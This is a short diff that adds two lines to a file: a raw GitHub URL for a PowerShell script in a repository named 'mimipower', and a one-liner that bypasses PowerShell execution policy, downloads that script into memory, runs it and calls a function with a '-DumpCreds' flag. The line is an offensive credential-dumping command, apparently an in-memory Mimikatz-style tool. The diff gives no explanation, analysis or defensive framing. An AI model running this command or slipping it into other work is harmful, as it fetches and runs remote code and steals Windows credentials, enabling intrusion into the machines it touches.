@@ -1,0 +1,3 @@
+https://raw.githubusercontent.com/sledgenop/mimipower/main/memnocom.ps1
+
+powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/sledgenop/mimipower/main/memnocom.ps1');callmim -DumpCreds"
